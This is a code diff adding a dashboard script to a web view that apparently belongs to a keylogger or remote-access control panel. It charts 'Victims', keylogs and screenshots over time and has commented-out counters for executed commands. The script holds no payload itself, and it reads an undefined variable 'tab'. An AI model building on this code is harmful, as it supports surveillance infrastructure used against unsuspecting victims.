@@ -36,4 +36,82 @@
         </div>
     </div>
 
+    <script>
+        $.post('/api/dashboard', {}, function(res) {
+            
+            console.log(res)
+
+            for (let element in res) {
+                console.log(element)
+                for (let i = 0; i < res[element].length; i++) {
+                    console.log(i)
+                    console.log(res[element][i].date)
+                }
+            }
+
+/*
+            // Loading total values into the page
+            $('#nb_clients').html(tab['clients']['nb_clients']);
+            $('#nb_logs').html(tab['keylogs']['nb_logs']);
+            $('#nb_screens').html(tab['screenshots']['nb_screenshots']);
+            $('#nb_cmd').html(tab['cmd']['nb_cmd']);
+*/
+
+            // Extract all the dates into an Array sorted by dates (alphabetic) and without any doublon
+            let dates = new Array();
+
+            for (let req in tab) {
+                if (['dates_clients', 'dates_keylogs', 'dates_screenshots', 'dates_cmd'].includes(req))
+                    for (let item in tab[req]) {
+                        dates.push(tab[req][item]['date']);
+                    }
+            }
+            dates.sort();
+            dates = Array.from(new Set(dates));
+
+
+            // Extracting values for each elements to display
+            let clients = extractValuesDate(tab['dates_clients'], dates);
+            let keylogs = extractValuesDate(tab['dates_keylogs'], dates);
+            let screenshots = extractValuesDate(tab['dates_screenshots'], dates);
+
+
+            // Creation of the chart of the dashboard
+            const ctx = document.getElementById('dashboard').getContext('2d');
+
+            const data = {
+                labels: dates,
+                datasets: [{
+                    label: 'Victims',
+                    data: clients,
+                    backgroundColor: 'rgba(255, 99, 132, 0.1)',
+                    borderColor: 'rgb(255, 99, 132)',
+                    borderWidth: 3
+                }, {
+                    label: 'Keylogs',
+                    data: keylogs,
+                    backgroundColor: 'rgba(170, 99, 132, 0.1)',
+                    borderColor: 'rgb(170, 99, 132)',
+                    borderWidth: 3
+                }, {
+                    label: 'Screenshots',
+                    data: screenshots,
+                    backgroundColor: 'rgba(170, 99, 80, 0.1)',
+                    borderColor: 'rgb(170, 99, 80)',
+                    borderWidth: 3
+                }]
+            };
+
+            const options = {};
+
+            const config = {
+                type: 'bar',
+                data: data,
+                options: options
+            };
+
+            const dashboard = new Chart(ctx, config);
+        });
+    </script>
+
 <%- include('../partials/footer'); %>
